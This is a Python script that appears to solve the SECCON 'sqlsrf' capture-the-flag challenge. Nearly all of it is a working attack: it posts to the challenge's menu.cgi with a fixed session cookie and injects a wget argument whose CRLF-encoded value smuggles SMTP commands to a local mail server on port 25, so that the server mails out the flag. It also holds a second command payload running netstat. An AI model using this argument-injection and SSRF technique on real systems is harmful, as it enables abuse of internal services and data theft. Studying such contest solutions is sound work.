import requests
from pyquery import PyQuery as pq
import html

URL = "http://sqlsrf.pwn.seccon.jp/sqlsrf/menu.cgi?"
MY_EMAIL_ADDRESS = "chalitourist@gmail.com"

commands = [
    "EHLO 127.0.0.1",
    "MAIL FROM: " + MY_EMAIL_ADDRESS,
    "RCPT TO: root",
    "DATA",
    "From: test@test.com",
    "To: " + MY_EMAIL_ADDRESS,
    "Subject: give me flag",
    "Hello",
    ".",
    "QUIT",
]

data = {
    'cmd': "wget --debug -O /dev/stdout 'http://",
    'args': "127.0.0.1%0d%0a{}%0a:25/".format("%0a".join(commands).replace(":", "%3a").replace("@", "%40"))
}


data2 = {
    "cmd": "netstat -tnl",
    "args": "--help"
}

headers = {
    "Cookie": "remember=58474452dda5c2bdc1f6869ace2ae9e3; CGISESSID=e9620817a01fafdfe8ea0359fa421280",
}

res = requests.post(URL, data=data, headers=headers).text
d = html.unescape(pq(res).find('pre').text())
if d != '':
    print(d)
else:
    print(res)
